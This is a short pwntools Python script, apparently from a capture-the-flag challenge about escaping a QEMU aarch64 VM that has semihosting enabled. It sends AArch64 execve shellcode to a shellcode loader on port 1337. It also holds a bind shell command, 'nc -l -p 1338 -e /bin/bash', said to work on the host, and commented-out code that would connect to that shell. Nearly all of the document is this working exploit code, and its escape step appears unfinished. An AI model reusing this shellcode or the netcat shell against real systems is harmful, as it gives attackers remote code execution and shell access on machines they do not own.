#!/usr/bin/env python3
# coding: utf8
from pwn import *

context.arch = 'aarch64'

"""
We exploited an arm64 VPS running qemu and dropped a shellcode loader on port 1337
Can you escape this VM, and get the /flag ? We know that a very uncommon configuration is used on qemu cmdline :

qemu-system-aarch64 -M virt -cpu cortex-a53 -nographic -smp 1 -kernel images/Image \
        -append "rootwait root=/dev/vda console=ttyAMA0" -netdev user,id=eth0,hostfwd=tcp::1337-:1337 \
        -device virtio-net-device,netdev=eth0 -drive file=images/rootfs.ext2,if=none,format=raw,id=hd0 \
        -device virtio-blk-device,drive=hd0 -semihosting-config enable=on,userspace=on

See https://www.qemu.org/docs/master/about/emulation.html#semihosting and attached qemu sources
"""

r = remote("127.0.0.1", 1337)


assembly = """
add sp, sp, 0x20
/** EXECVE **/
/* path */
adr x0, sh
/* argp */
str x0, [sp]
adr x1, arg1
str x1, [sp,8]
adr x1, cmd
str x1, [sp,16]
str xzr, [sp,24]
mov x1, sp
/* envp */
mov x2, #0
/* syscall */
mov x8, #SYS_execve
svc 0
sub sp, sp, 0x20
ret

/* we know for sure that this command works on the host */
hostcmd:
        .asciz "nc -l -p 1338 -e /bin/bash"
sh:
        .asciz "/bin/sh"
arg1:
        .asciz "-c"
cmd:
        .asciz "/usr/bin/id"

"""

shellcode = asm(assembly)
r.send(shellcode)
#time.sleep(1)
#r = remote("127.0.0.1", 1338)
#r.interactive()
print(r.recvall())
